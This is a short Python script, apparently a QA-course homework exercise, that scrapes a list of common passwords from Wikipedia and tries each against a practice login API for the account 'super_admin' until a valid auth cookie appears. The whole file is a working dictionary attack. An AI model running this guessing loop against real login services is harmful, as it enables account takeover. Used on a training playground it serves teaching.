from typing import List
import requests
from bs4 import BeautifulSoup
from lxml import etree
import argparse


def get_all_passwords() -> List:
    PASSWORDS_URL = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
    password_locator = "//table[@class='wikitable']/*[contains(text(),'SplashData')]/..//td[not(@align='center')]"
    get_passwords_response = requests.get(PASSWORDS_URL)
    soup = BeautifulSoup(get_passwords_response.text, "html.parser")
    dom = etree.HTML(str(soup))
    return [(password.text).strip() for password in dom.xpath(password_locator)]


def try_to_find_password(login) -> str:
    URL_HW = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    URL_CHECK_COOKIE = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    user_login = login

    all_passwords = get_all_passwords()
    count = len(all_passwords)

    for password in all_passwords:
        user_password = password
        cookies = {}
        hw_params = {
            'login': f'{user_login}',
            'password': f'{user_password}'
        }

        hw_response = requests.post(URL_HW, data=hw_params)
        auth_cookie = hw_response.cookies.get('auth_cookie')

        if auth_cookie is not None:
            cookies.update({'auth_cookie': auth_cookie})
        is_cookie_valid = requests.post(URL_CHECK_COOKIE, cookies=cookies).text
        print(f"{count} with auth_cookie {auth_cookie} and password {password} response is {is_cookie_valid}")
        if is_cookie_valid == "You are NOT authorized":
            count -= 1
            continue
        else:
            print(f"correct password is {password}")
            return password

    print("Password was not found!")
    return "Password was not found!"




if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='get login argument')
    parser.add_argument('--login', default="super_admin", help="user login")
    args = vars(parser.parse_args())
    try_to_find_password(login=args['login'])